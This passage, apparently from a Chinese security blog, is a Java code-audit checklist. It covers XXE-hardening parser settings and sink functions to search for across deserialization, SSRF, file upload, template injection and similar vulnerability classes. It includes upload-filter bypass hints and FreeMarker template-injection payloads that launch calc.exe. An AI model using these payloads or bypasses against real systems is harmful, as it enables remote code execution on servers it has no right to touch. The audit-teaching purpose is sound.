<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">XMLInputFactory (a StAX parser)</span><br><span class="line">xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, <span class="literal">false</span>); <span class="comment">// This disables DTDs entirely for that </span></span><br><span class="line">factory</span><br><span class="line">xmlInputFactory.setProperty(<span class="string">&quot;javax.xml.stream.isSupportingExternalEntities&quot;</span>, <span class="literal">false</span>); <span class="comment">// disable external entities</span></span><br><span class="line"></span><br><span class="line">TransformerFactory</span><br><span class="line"><span class="type">TransformerFactory</span> <span class="variable">tf</span> <span class="operator">=</span> TransformerFactory.newInstance();</span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">&quot;&quot;</span>);</span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">Validator</span><br><span class="line"><span class="type">SchemaFactory</span> <span class="variable">factory</span> <span class="operator">=</span> SchemaFactory.newInstance(<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span>);</span><br><span class="line"><span class="type">Schema</span> <span class="variable">schema</span> <span class="operator">=</span> factory.newSchema();</span><br><span class="line"><span class="type">Validator</span> <span class="variable">validator</span> <span class="operator">=</span> schema.newValidator();</span><br><span class="line">validator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">&quot;&quot;</span>);</span><br><span class="line">validator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">SchemaFactory</span><br><span class="line"><span class="type">SchemaFactory</span> <span class="variable">factory</span> <span class="operator">=</span> SchemaFactory.newInstance(<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span>);</span><br><span class="line">factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">&quot;&quot;</span>);</span><br><span class="line">factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="type">Schema</span> <span class="variable">schema</span> <span class="operator">=</span> factory.newSchema(Source);</span><br><span class="line"></span><br><span class="line">SAXTransformerFactory</span><br><span class="line"><span class="type">SAXTransformerFactory</span> <span class="variable">sf</span> <span class="operator">=</span> SAXTransformerFactory.newInstance();</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">&quot;&quot;</span>);</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="string">&quot;&quot;</span>);</span><br><span class="line">sf.newXMLFilter(Source);</span><br><span class="line"><span class="comment">//Note: Use of the following XMLConstants requires JAXP 1.5, which was added to Java in 7u40 and Java 8:</span></span><br><span class="line">javax.xml.XMLConstants.ACCESS_EXTERNAL_DTD</span><br><span class="line">javax.xml.XMLConstants.ACCESS_EXTERNAL_SCHEMA</span><br><span class="line">javax.xml.XMLConstants.ACCESS_EXTERNAL_STYLESHEET</span><br><span class="line"></span><br><span class="line">XMLReader</span><br><span class="line"><span class="type">XMLReader</span> <span class="variable">reader</span> <span class="operator">=</span> XMLReaderFactory.createXMLReader();</span><br><span class="line">reader.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">reader.setFeature(<span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="literal">false</span>); <span class="comment">// This may </span></span><br><span class="line">not be strictly required as DTDs shouldn<span class="string">&#x27;t be allowed at all, per previous line.</span></span><br><span class="line"><span class="string">15 / 28</span></span><br><span class="line"><span class="string">reader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span></span><br><span class="line"><span class="string">reader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">SAXReader</span></span><br><span class="line"><span class="string">saxReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span></span><br><span class="line"><span class="string">saxReader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span></span><br><span class="line"><span class="string">saxReader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span></span><br><span class="line"><span class="string">//Based on testing, if you are missing one of these, you can still be vulnerable to an XXE attack.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">SAXBuilder</span></span><br><span class="line"><span class="string">SAXBuilder builder = new SAXBuilder();</span></span><br><span class="line"><span class="string">builder.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;,true);</span></span><br><span class="line"><span class="string">builder.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span></span><br><span class="line"><span class="string">builder.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span></span><br><span class="line"><span class="string">Document doc = builder.build(new File(fileName));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Unmarshaller</span></span><br><span class="line"><span class="string">SAXParserFactory spf = SAXParserFactory.newInstance();</span></span><br><span class="line"><span class="string">spf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span></span><br><span class="line"><span class="string">spf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span></span><br><span class="line"><span class="string">spf.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);</span></span><br><span class="line"><span class="string">Source xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(), new InputSource(new StringReader(xml)));</span></span><br><span class="line"><span class="string">JAXBContext jc = JAXBContext.newInstance(Object.class);</span></span><br><span class="line"><span class="string">Unmarshaller um = jc.createUnmarshaller();</span></span><br><span class="line"><span class="string">um.unmarshal(xmlSource);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">XPathExpression</span></span><br><span class="line"><span class="string">DocumentBuilderFactory df = DocumentBuilderFactory.newInstance();</span></span><br><span class="line"><span class="string">df.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;); </span></span><br><span class="line"><span class="string">df.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;); </span></span><br><span class="line"><span class="string">DocumentBuilder builder = df.newDocumentBuilder();</span></span><br><span class="line"><span class="string">String result = new XPathExpression().evaluate( builder.parse(new </span></span><br><span class="line"><span class="string">ByteArrayInputStream(xml.getBytes())) );</span></span><br></pre></td></tr></table></figure>

<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>审计的注意点</p>
<ul>
<li>反序列化操作的功能位置：导入模版文件、网络通信、数据传输、日志格式化存储、对象数据落磁盘或DB存储等业务场景。</li>
<li>可以通过对网络抓包寻找序列化数据：java序列化的数据一般会以标记（ac ed 00 05）开头，base64编码后的特征为rO0AB。</li>
<li>查看反序列化触发点的参数是否由用户可控。</li>
<li>全局查找implements Serializable 的所有内部类。</li>
<li>程序中存在一条可以产生安全问题的利用链，如远程代码执行，并找到一个可以触发利用链的点。</li>
</ul>
<p>关键函数或字符串查找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject</span><br><span class="line">ObjectInputStream.readUnshared</span><br><span class="line">XMLDecoder.readObject</span><br><span class="line">Yaml.load</span><br><span class="line">XStream.fromXML</span><br><span class="line">ObjectMapper.readValue</span><br><span class="line">JSON.parseObject</span><br></pre></td></tr></table></figure>

<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>审计的注意点</p>
<ul>
<li>重点关注能执行命令的一些功能及函数</li>
</ul>
<p>关键函数或字符串查找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec()</span><br><span class="line">Process</span><br><span class="line">UNIXProcess</span><br><span class="line">ProcessImpl</span><br><span class="line">ProcessBuilder.start()</span><br><span class="line">GroovyShell.evaluate()</span><br><span class="line">由java后端模板引擎注入导致的 RCE 漏洞，常见的如：Freemarker、Velocity、Thymeleaf等</span><br><span class="line">由java一些脚本语言引起的 RCE 漏洞，常见的如：Groovy、JavascriptEngine等</span><br><span class="line">由第三方开源组件引起的 RCE 漏洞，常见的如：Fastjson、Shiro、Xstream、Struts2、weblogic等</span><br></pre></td></tr></table></figure>

<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><p>审计的注意点</p>
<ul>
<li>SSRF 漏洞出现的场景有很多，如在线翻译、转码服务、图片收藏&#x2F;下载、信息采集、邮件系统或者从远程服务器请求资源等。通常我们可 以通过浏览器查看源代码查找是否在本地进行了请求，也可以使用 DNSLog 等工具进行测试网页是否被访问。</li>
<li>重点关注HTTP请求操作函数。</li>
<li>想要支持所有的协议，只能使用URLConnection、URL。</li>
</ul>
<p>关键函数或字符串查找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HttpClient.execute()</span><br><span class="line">HttpClient.executeMethod()</span><br><span class="line">HttpURLConnection.connect()</span><br><span class="line">HttpURLConnection.getInputStream()</span><br><span class="line">URL.openStream()</span><br><span class="line">HttpServletRequest()</span><br><span class="line">BasicHttpEntityEnclosingRequest()</span><br><span class="line">DefaultBHttpClientConnection()</span><br><span class="line">BasicHttpRequest()</span><br><span class="line">ImageIO.read()</span><br><span class="line">Request.Get.execute</span><br><span class="line">Request.Post.execute</span><br><span class="line">OkHttpClient.newCall.execute</span><br><span class="line">com.alibaba.druid.util.HttpClientUtils</span><br><span class="line">javax.servlet.http.HttpServletRequest</span><br><span class="line">java.net.URI</span><br><span class="line">java.net.URL</span><br><span class="line">java.net.URLConnection</span><br><span class="line">com.bea.uddiexplorer.Search</span><br><span class="line">org.apache.commons.httpclient.HttpMethodBase</span><br><span class="line">org.apache.http.client.methods.HttpRequestBase</span><br></pre></td></tr></table></figure>

<p>除了建立HTTP协议连接，还可能直接通过 Socket建立连接</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AsynchronousServerSocketChannel.accept/bind</span><br><span class="line">AsynchronousSocketChannel.write/read/bind/connect</span><br><span class="line">ServerSocketChannel.bind</span><br><span class="line">ServerSocket.accept/bind</span><br><span class="line">Socket.bind/connect</span><br><span class="line">Socket.getInputStream().read</span><br><span class="line">Socket.getOutputStream().write</span><br><span class="line">SocketChannel.bind/read/write/connect</span><br></pre></td></tr></table></figure>

<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>审计的注意点</p>
<ul>
<li>关注文件后缀验证，是使用白名单还是黑名单。</li>
<li>最好使用<code>lastIndexOf()</code>方法获取文件后缀，如果使用<code>IndexOf()</code>可能被绕过。</li>
<li>如果是白名单验证时，使用<code>toLowerCase()</code>处理再进行对比，或使用<code>equalsIgnoreCase()</code>，避免被大小写绕过。</li>
<li>是否校验了文件的大小。</li>
<li>是否校验了文件类型<code>getContentType()</code>。</li>
<li>对于使用Hutool的FileTypeUtil的<code>getType()</code>或<code>ImageIO.read()</code>通过读取文件流中前N个byte值来判断文件类型的，也可以使用类似图片马的方式进行绕过。</li>
<li>尝试”%00”截断能否绕过。</li>
<li>QP编码特性能否绕过。<code>javax.mail.internet.MimeUtility.encodeWord()</code>方法。</li>
<li>有一些安全校验的顺序有问题，先将文件保存，再进行安全检测，如果不通过检测则进行删除，此时可以在文件保存后触发报错终止流程，导致不删除文件。</li>
</ul>
<p>关键函数或字符串查找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">FileUpload</span><br><span class="line">FileUploadBase</span><br><span class="line">FileItemIteratorImpl</span><br><span class="line">FileItemStreamImpl</span><br><span class="line">FileUtils</span><br><span class="line">UploadHandleServlet</span><br><span class="line">FileLoadServlet</span><br><span class="line">FileOutputStream</span><br><span class="line">DiskFileItemFactory</span><br><span class="line">MultipartRequestEntity</span><br><span class="line">MultipartFile</span><br><span class="line">com.oreilly.servlet.MultipartRequest</span><br><span class="line">java.io.File</span><br><span class="line">MultipartMethod</span><br><span class="line">MultipartHttpServletRequest</span><br><span class="line">CommonsMutipartResolver</span><br><span class="line">upload</span><br><span class="line">fileNmae</span><br><span class="line">filePath</span><br><span class="line">lastIndexOf</span><br><span class="line">indexOf</span><br><span class="line">FileUpload</span><br><span class="line">getRealPath</span><br><span class="line">getServletPath</span><br><span class="line">getPathInfo</span><br><span class="line">getContentType</span><br><span class="line">equalsIgnoreCase</span><br><span class="line">FileUtils</span><br><span class="line">UploadHandleServlet</span><br><span class="line">FileLoadServlet</span><br><span class="line">getInputStream</span><br><span class="line">DiskFileItemFactory</span><br><span class="line">file.getInputStream()</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ServletFileUpload</span>(factory)</span><br><span class="line">handleFileUpload(<span class="meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file)</span><br></pre></td></tr></table></figure>

<h4 id="任意文件读-x2F-写-x2F-删除-x2F-复制-x2F-移动-x2F-遍历"><a href="#任意文件读-x2F-写-x2F-删除-x2F-复制-x2F-移动-x2F-遍历" class="headerlink" title="任意文件读&#x2F;写&#x2F;删除&#x2F;复制&#x2F;移动&#x2F;遍历"></a>任意文件读&#x2F;写&#x2F;删除&#x2F;复制&#x2F;移动&#x2F;遍历</h4><p>审计的注意点</p>
<ul>
<li>首先关注包含这些功能的类和函数</li>
<li>对传入的路径未做严格的校验，导致攻击者可以自定义路径</li>
</ul>
<p>关键函数或字符串查找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sun.nio.ch.FileChannelImpl</span><br><span class="line">java.io.File.list/listFiles</span><br><span class="line">java.io.FileInputStream</span><br><span class="line">java.io.FileOutputStream</span><br><span class="line">java.io.FileSystem/Win32FileSystem/WinNTFileSystem/UnixFileSystem</span><br><span class="line">sun.nio.fs.UnixFileSystemProvider/WindowsFileSystemProvider</span><br><span class="line">java.io.RandomAccessFile</span><br><span class="line">sun.nio.fs.CopyFile</span><br><span class="line">sun.nio.fs.UnixChannelFactory</span><br><span class="line">sun.nio.fs.WindowsChannelFactory</span><br><span class="line">java.nio.channels.AsynchronousFileChannel</span><br><span class="line">FileUtil/IOUtil</span><br><span class="line">filePath/download/deleteFile/move/getFile</span><br><span class="line">fileName/filePath</span><br></pre></td></tr></table></figure>

<h4 id="URL跳转"><a href="#URL跳转" class="headerlink" title="URL跳转"></a>URL跳转</h4><p>审计的注意点</p>
<ul>
<li>用户登录、统一身份认证处，认证完了会通过url&#x3D;的形式跳转到类似操作的页面。</li>
<li>用户分享、收藏内容后跳转。</li>
<li>跨域认证授权后进行跳转。</li>
<li>对于URL跳转漏洞在黑盒测试时主要的关注点为：注意URL中是否带有return、redirect、url、jump、goto、target、link等 参数值，并注意观察后跟的URL地址的具体格式，再构造相应的payload尝试跳转。在白盒审计中我们则会重点关注可以进行URL跳转的相关方法。</li>
<li>定位可能存在redirect业务的代码段，审计跳转的URL是否来自于前端参数，是否具有校验和限制。</li>
</ul>
<p>关键函数或字符串查找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sendRedirect</span><br><span class="line">setHeader</span><br><span class="line">forward</span><br><span class="line">redirect:</span><br><span class="line">&lt;c:redirect</span><br><span class="line">self.location.href</span><br><span class="line">location.href</span><br><span class="line">windows.location.href</span><br><span class="line">redirect、redirect_do、redirect_url、url、jump、jump_to、target、to、link、domain</span><br></pre></td></tr></table></figure>

<h4 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h4><p>审计的注意点</p>
<ul>
<li>重点审计系统使用的框架、组件，根据经验查看配置，配置是否有误、是否将调试功能正式上线到生产环境中等。</li>
<li>由于配置不当或使用有误，将可能导致泄露服务器的敏感信息。<br>例如：swagger 接口文档、Hystrix 监控面板、DWR 框架、Actuator、druid监控平台等等。</li>
</ul>
<p>关键函数或字符串查找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SwaggerConfig </span><br><span class="line">Swagger2Config </span><br><span class="line"><span class="meta">@EnableSwaggerBootstrapUI</span></span><br><span class="line"><span class="meta">@EnableSwagger2</span></span><br><span class="line">application.properties或者application.yml：swagger.production=<span class="literal">true</span>或swagger.basic.enable=<span class="literal">true</span></span><br><span class="line">Hystrix</span><br><span class="line">spring.datasource.druid.stat-view-servlet.enabled=<span class="literal">false</span>（<span class="literal">false</span>禁用，<span class="literal">true</span>开启）</span><br><span class="line">spring.datasource.druid.stat-view-servlet.enabled=<span class="literal">true</span></span><br><span class="line">spring.datasource.druid.stat-view-servlet.login-username=</span><br><span class="line">spring.datasource.druid.stat-view-servlet.login-password=</span><br><span class="line">endpoints.enabled = <span class="literal">false</span></span><br><span class="line">endpoints:</span><br><span class="line">management:</span><br></pre></td></tr></table></figure>

<h4 id="代码执行-x2F-表达式执行"><a href="#代码执行-x2F-表达式执行" class="headerlink" title="代码执行&#x2F;表达式执行"></a>代码执行&#x2F;表达式执行</h4><p>审计的注意点</p>
<ul>
<li>重点审计具有加载类、反序列化类、对类字节码进行操作的功能和代码</li>
</ul>
<p>关键函数或字符串查找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">eval</span><br><span class="line">classLoader</span><br><span class="line">$$BCEL$$</span><br><span class="line">ServiceLoader</span><br><span class="line">ToolProvider.getSystemJavaCompiler()</span><br><span class="line">getSystemClassLoader</span><br><span class="line">JavaFileObject</span><br><span class="line">JdbcRowSetImpl</span><br><span class="line">TemplatesImpl</span><br><span class="line">TransformerFactoryImpl</span><br><span class="line">resolveClass</span><br><span class="line">loadClass</span><br><span class="line">javax.el.ELProcessor</span><br><span class="line">SpelExpressionParser</span><br><span class="line">org.springframework.expression.spel.standard</span><br><span class="line">parseExpression</span><br><span class="line">expression.getValue()</span><br><span class="line">expression.setValue()</span><br></pre></td></tr></table></figure>

<h4 id="Zip文件提取"><a href="#Zip文件提取" class="headerlink" title="Zip文件提取"></a>Zip文件提取</h4><p>审计的注意点</p>
<ul>
<li>重点主要关注应用是否存在ZIP解压缩功能</li>
</ul>
<p>关键函数或字符串查找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">FileInputStream</span><br><span class="line">ZipInputStream</span><br><span class="line"><span class="title function_">getSize</span><span class="params">()</span></span><br><span class="line">ZipEntry</span><br></pre></td></tr></table></figure>

<h4 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 用户登陆、用户注册、找回密码等功能中密码信息未采用加密算法。</span><br><span class="line">2. 用户登陆、用户注册、找回密码等功能中`未采用验证码`或`验证码未做安全刷新`(未刷新Session中验证码的值)导致的撞库、密码爆破漏洞。</span><br><span class="line">3. 找回密码逻辑问题(如:可直接跳过验证逻辑直接发包修改)。</span><br><span class="line">4. 手机、邮箱验证、找回密码等涉及到动态验证码`未限制验证码失败次数`、`验证码有效期`、`验证码长度过短`导致的验证码爆破问题。</span><br><span class="line">5. 充值、付款等功能调用了第三方支付系统未正确校验接口(与第三方的交互、与客户的交互，主要查看逻辑问题)。</span><br><span class="line">6. 后端采用了`ORM框架`更新操作时因处理不当导致可以更新用户表任意字段(如:用户注册、用户个人资料修改时可以`直接创建管理员账号`或其他越权修改操作)。</span><br><span class="line">7. 后端采用了`ORM框架`查询数据时因处理不当导致可以接收任何参数导致的越权查询、敏感信息查询等安全问题。</span><br><span class="line">8. 用户中心转账、修改个人资料、密码、退出登陆等功能未采用验证码或`Token机制`导致存在`CSRF漏洞`。</span><br><span class="line">9. 后端服务过于信任前端，重要的参数和业务逻辑只做了前端验证(如:文件上传功能的文件类型只在JS中验证、后端不从Session中获取用户ID、用户名而是直接接收客户端请求的参数导致的`越权问题`)。</span><br><span class="line">10. 用户身份信息认证逻辑问题(如:后台系统自动登陆时直接读取Cookie中的用户名、用户权限不做验证)。</span><br><span class="line">11. 重要接口采用`ID自增、ID可预测并且云端未验证参数有效性`导致的越权访问、信息泄漏问题(如:任意用户订单越权访问)。</span><br><span class="line">12. `条件竞争问题`，某些关键业务(如:用户转账)不支持并发、分布式部署时不支持锁的操作等。</span><br><span class="line">13. 重要接口`未限制请求频率`，导致短信、邮件、电话、私信等信息轰炸。</span><br><span class="line">14. 敏感信息未保护，如`Cookie中直接存储用户密码等重要信息`，跟踪cookie中的变量最终到了哪。</span><br><span class="line">15. 弱加密算法、弱密钥，如勿把Base64当成数据加密方式、重要算法密钥采用弱口令如`123456`。</span><br><span class="line">16. 后端无异常处理机制、未自定义50X错误页面,服务器异常导致敏感信息泄漏(如:数据库信息、网站绝对路径等)。</span><br><span class="line">17. 使用`DWR框架`开发时前后端不分漏洞(如:DWR直接调用数据库信息把用户登陆逻辑直接放到了前端来做)。</span><br></pre></td></tr></table></figure>

<h4 id="硬编码"><a href="#硬编码" class="headerlink" title="硬编码"></a>硬编码</h4><p>审计的注意点</p>
<ul>
<li>审计源代码中是否有硬编码敏感信息。</li>
</ul>
<p>关键函数或字符串查找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">password</span><br><span class="line">pass</span><br><span class="line">jdbc</span><br><span class="line">auth</span><br><span class="line">key</span><br></pre></td></tr></table></figure>

<h4 id="不安全的反射"><a href="#不安全的反射" class="headerlink" title="不安全的反射"></a>不安全的反射</h4><p>审计的注意点</p>
<ul>
<li>查看开发人员是否对反射调用方法、反射创建类实例进行了封装，并是否在对外的接口中进行了相关的调用。</li>
</ul>
<p>关键函数或字符串查找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName</span><br><span class="line">Method.invoke</span><br><span class="line">newInstance</span><br><span class="line">Worker/Invoker</span><br></pre></td></tr></table></figure>

<h4 id="使用了不安全的组件"><a href="#使用了不安全的组件" class="headerlink" title="使用了不安全的组件"></a>使用了不安全的组件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">组件例如 fastjson、jackson、xstream、shiro、xxl-job，框架例如 struts2、spring 等等，都要注意使用的版本问题。</span><br></pre></td></tr></table></figure>

<h4 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h4><ol>
<li>内建函数的利用：虽然FreeMarker中预制了大量的内建函数，极大地增强和拓展了模板的语言功能，但也可能引发一些危险操作。若研发人员不加以限制， 则很可能产生安全隐患。</li>
<li>new函数的利用：new函数可以创建一个继承自freemarker.template.TemplateModel 类的实例，查阅源码会发现freemarker.template.utility.Execute#exec可以执行 任意代码，因此可以通过new函数实例化一个Execute对象并执行exec() 方法造成任意代码被执行。</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectConstructor：&lt;#assign value=<span class="string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="keyword">new</span>()&gt;$&#123;value(<span class="string">&quot;Java.lang. ProcessBuilder&quot;</span>,<span class="string">&quot;calc.exe&quot;</span>).start()&#125;</span><br><span class="line"></span><br><span class="line">JythonRuntime：&lt;#assign value=<span class="string">&quot;freemarker.template.utility.JythonRuntime&quot;</span>?<span class="keyword">new</span>()&gt;&lt;<span class="meta">@value</span>&gt;<span class="keyword">import</span> os;os. system(<span class="string">&quot;calc.exe&quot;</span>)&lt;/<span class="meta">@value</span>&gt;</span><br><span class="line"></span><br><span class="line">Execute：&lt;#assign value=<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()&gt;$&#123;value(<span class="string">&quot;calc.exe&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>api函数的利用：api函数可以用来访问Java API，使用方法为value?api.someJavaMethod()，相当于value.someJavaMethod()。因此可以利用api函数通过 getClassLoader来获取一个类加载器，进而加载恶意类。也可以通过getResource来读取服务器上的资源文件。</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;#assign classLoader=object?api.class.getClassLoader()&gt;</span><br><span class="line">$&#123;classLoader.loadClass(<span class="string">&quot;Evil.class&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h4><p>审计的注意点</p>
<ul>
<li>一些增删改查方法，是否进行<code>Referer头检验</code>、<code>token检验</code> <code>无法构造的随机数参数</code>、<code>验证码密码</code></li>
</ul>
<p>关键函数或字符串查找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">session[<span class="string">&quot;token&quot;</span>]</span><br></pre></td></tr></table></figure>

<h4 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h4><p>审计的注意点</p>
<ul>
<li>在每个<code>request.getParameter(&quot;userid&quot;);</code>之后查看是否有检验当前用户与要进行增删改查的用户。</li>
</ul>
<p>关键函数或字符串查找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">request.getParameter(<span class="string">&quot;userid&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>审计的注意点</p>
<ul>
<li>关注jsp是否存在文件包含的方法</li>
</ul>
<p>关键函数或字符串查找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">本地文件包含：</span><br><span class="line">&lt;jsp:include page=<span class="string">&quot;&lt;%=file%&gt;&quot;</span>&gt;&lt;/jsp:include&gt;</span><br><span class="line">&lt;jsp:<span class="type">include</span> <span class="variable">page</span> <span class="operator">=</span><span class="string">&quot;&lt;%=file%&gt;&quot;</span>/&gt;</span><br><span class="line">%<span class="meta">@include</span> file=<span class="string">&quot;test.jsp&quot;</span>%</span><br><span class="line">远程文件包含：</span><br><span class="line">&lt;c:<span class="keyword">import</span> url=<span class="string">&quot;&lt;%= url%&gt;&quot;</span>&gt;&lt;/c:<span class="keyword">import</span>&gt;</span><br></pre></td></tr></table></figure>

<h4 id="XMLDecoder反序列化"><a href="#XMLDecoder反序列化" class="headerlink" title="XMLDecoder反序列化"></a>XMLDecoder反序列化</h4><p>审计注意点</p>
<ul>
<li>观察传入XMLDecoder()的参数是否可控</li>
</ul>
<p>关键函数或字符串查找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">XMLDecoder</span> <span class="variable">decoder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLDecoder</span>(ins);</span><br><span class="line">deocder.readObject()</span><br></pre></td></tr></table></figure>

<h4 id="BeanShell-RCE"><a href="#BeanShell-RCE" class="headerlink" title="BeanShell RCE"></a>BeanShell RCE</h4><p>审计注意点</p>
<ul>
<li>查找参数是否可控</li>
</ul>
<p>关键函数或字符串查找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Interpreter</span> <span class="variable">interpreter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Interpreter</span>();</span><br><span class="line">Interpreter.eval(evalString)</span><br></pre></td></tr></table></figure>

<h4 id="SnakeYaml反序列化"><a href="#SnakeYaml反序列化" class="headerlink" title="SnakeYaml反序列化"></a>SnakeYaml反序列化</h4><p>审计注意点</p>
<ul>
<li>直接定位<code>yaml.load()</code>，然后进行回溯，查看下参数是否可控</li>
</ul>
<p>关键函数或字符串查找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>()</span><br><span class="line">yaml.load()</span><br></pre></td></tr></table></figure>

<h4 id="未授权访问-x2F-权限绕过"><a href="#未授权访问-x2F-权限绕过" class="headerlink" title="未授权访问&#x2F;权限绕过"></a>未授权访问&#x2F;权限绕过</h4><p>审计注意点</p>
<ul>
<li>查看权限校验的过滤器，观察是否存在校验不严格的路由，或者是否存在检验绕过的情况</li>
<li>找出全部的请求路由</li>
</ul>
<p>关键函数或字符串查找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">@(.*?)Mapping(</span><br><span class="line">request.getRequestURL()</span><br><span class="line">request.getRequestURI()</span><br></pre></td></tr></table></figure>



<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://su18.org/post/code-audit/">https://su18.org/post/code-audit/</a></p>
<p><a href="https://github.com/Cryin/JavaID">https://github.com/Cryin/JavaID</a></p>
<p><a href="https://shu1l.github.io/2021/01/27/java-dai-ma-shen-ji-zhi-chang-jian-lou-dong-xue-xi/">https://shu1l.github.io/2021/01/27/java-dai-ma-shen-ji-zhi-chang-jian-lou-dong-xue-xi/</a></p>
<p>《网络安全JAVA代码审计实战》</p>
<p>《JAVA代码审计入门篇》</p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之JNDI注入</title>
    <url>/2022/06/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BJNDI%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>JNDI注入是反序列化漏洞常用的攻击手法之一。</p>
<span id="more"></span>

